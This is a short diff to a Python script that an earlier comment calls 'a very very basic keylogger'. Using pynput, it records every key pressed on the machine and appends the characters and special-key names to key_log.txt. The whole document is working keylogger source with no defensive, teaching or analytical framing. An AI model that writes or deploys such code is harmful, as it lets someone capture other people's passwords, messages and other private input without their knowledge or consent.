@@ -1,14 +1,22 @@
-# A very very basic keylogger written in python
+from pynput.keyboard import Listener, Key
 
-from pynput.keyboard import Key, Listener
-import logging
-
-save_location = ''
-
-logging.basicConfig(filename=(save_location + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+filename = "key_log.txt"
 
 def on_press(key):
-    logging.info(str(key))
+    f = open(filename, 'a')  
+
+    if hasattr(key, 'char'):
+        f.write(key.char)
+    elif key == Key.space:
+        f.write(' ')
+    elif key == Key.enter:
+        f.write('\n')
+    elif key == Key.tab:
+        f.write('\t')
+    else:
+        f.write('[' + key.name + ']')
+
+    f.close()
 
 with Listener(on_press=on_press) as listener:
     listener.join()
